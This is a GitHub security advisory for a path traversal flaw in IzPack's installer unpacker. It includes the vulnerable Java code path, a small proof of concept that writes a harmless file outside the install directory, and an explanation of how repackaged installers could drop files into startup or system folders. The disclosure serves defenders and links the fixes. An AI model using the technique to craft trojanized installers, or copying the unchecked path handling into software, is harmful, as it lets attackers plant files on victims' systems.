# [H] IzPack has Path Traversal in UnpackerBase that allows writing files outside the installation directory via malicious pack entries

## Summary
Severity: High
Advisory: GHSA-f63g-88cj-hjf9
CVE: CVE-2026-54550
CWE: CWE-22
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-08-26
Source: https://github.com/advisories/GHSA-f63g-88cj-hjf9
Type: github-advisory

## Affected
- Maven: `org.codehaus.izpack:izpack-installer` — affected >=0

## Details
### Summary

IzPack's `UnpackerBase.unpack()` resolves pack-file target paths without any
canonical-path or directory-containment check. An attacker who distributes a
trojanized installer JAR (the format is unsigned) can include pack entries whose
`targetPath` contains `../` sequences. When a victim runs the installer the
file is written to an attacker-chosen location on disk under the victim's
privileges — including startup folders, PATH directories, or system locations.

### Details

**Vulnerable method:** `com.izforge.izpack.installer.unpacker.UnpackerBase.unpack()`
**Source file:** `izpack-installer/src/main/java/com/izforge/izpack/installer/unpacker/UnpackerBase.java`
**Vulnerable lines (5.2.4):** ~618–627

The relevant code path is:

```java
String targetPath = packFile.getTargetPath();             // attacker-controlled
String path       = IoHelper.translatePath(targetPath, variables); // separator swap ONLY
File   target     = new File(path);                       // no canonical check
// ... mkdirs() then file is written to `target`
```

`IoHelper.translatePath()` (source: `izpack-util/.../IoHelper.java`) performs
**only** file-separator character conversion (`'/'` ↔ `File.separatorChar`) and
contains no security validation whatsoever. There is no call to
`getCanonicalPath()`, no `startsWith(installDir)` containment check, and no
normalisation of `..` segments.

Because IzPack installer JARs carry **no digital signature**, an attacker can
repack any legitimate installer with malicious `PackFile` entries. The file
format is a standard ZIP with serialised resources — no integrity protection.

**Confirmed unpatched in HEAD (fetched from GitHub, 2025):**
```
git show HEAD:izpack-installer/src/main/java/com/izforge/izpack/installer/unpacker/UnpackerBase.java \
  | grep -n 'getCanonicalPath\|startsWith.*install\|traversal'
# (no output — fix not present)
```

### PoC

```bash
# 1. Clone IzPack source and view the vulnerable code directly
git clone --depth=1 --branch izpack-5.2.4 https://github.com/izpack/izpack.git
sed -n '615,650p' izpack/izpack-installer/src/main/java/com/izforge/izpack/installer/unpacker/UnpackerBase.java

# 2. Compile and run the following Java reproducer (no IzPack classpath needed):
```

```java
// TestPathTraversal.java
import java.io.*;

public class TestPathTraversal {
    // Exact replication of IoHelper.translatePath() — separator swap, no security
    static String translatePath(String destination) {
        return destination.replace('/', File.separatorChar);
    }

    public static void main(String[] args) throws Exception {
        String installDir   = "/tmp/izpack_install";
        String maliciousPath = installDir + "/../../../tmp/ESCAPED_FILE";

        // This is what UnpackerBase does:
        String path   = translatePath(maliciousPath);
        File   target = new File(path);           // resolves traversal
        target.getParentFile().mkdirs();
        try (FileWriter fw = new FileWriter(target)) {
            fw.write("Written outside install dir via IzPack path traversal\n");
        }
        System.out.println("File written to: " + target.getCanonicalPath());
        System.out.println("Inside installDir: " +
            target.getCanonicalPath().startsWith(new File(installDir).getCanonicalPath()));
    }
}
```

```bash
javac TestPathTraversal.java && java TestPathTraversal
# Output: File written to: /tmp/ESCAPED_FILE
#         Inside installDir: false
```

### Impact

Any user who runs an IzPack-generated installer is affected. The attacker only
needs to distribute a repackaged installer — a common social-engineering vector.
On Windows (the primary IzPack platform) the victim typically runs the installer
as a local administrator, so the attacker can write to `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`,
`%SystemRoot%\System32`, or any other location reachable by the victim user.
On Linux/macOS the same applies for user-writable locations.

No authentication, no special privileges and no interaction beyond running the
installer are required on the victim side.

### Credits
This issue was identified by Michał Majchrowicz, Marcin Wyczechowski, and Paweł Zdunek, members of the AFINE Team.

## References
- https://github.com/izpack/izpack/security/advisories/GHSA-f63g-88cj-hjf9
- https://github.com/izpack/izpack/pull/1193
- https://github.com/izpack/izpack/commit/4233ba38d0f1825f9cf3e0204e5261a5498e29d8
- https://github.com/izpack/izpack/commit/8b7c6792c4fe85e3b1759c106aae39b904848466
- https://github.com/izpack/izpack
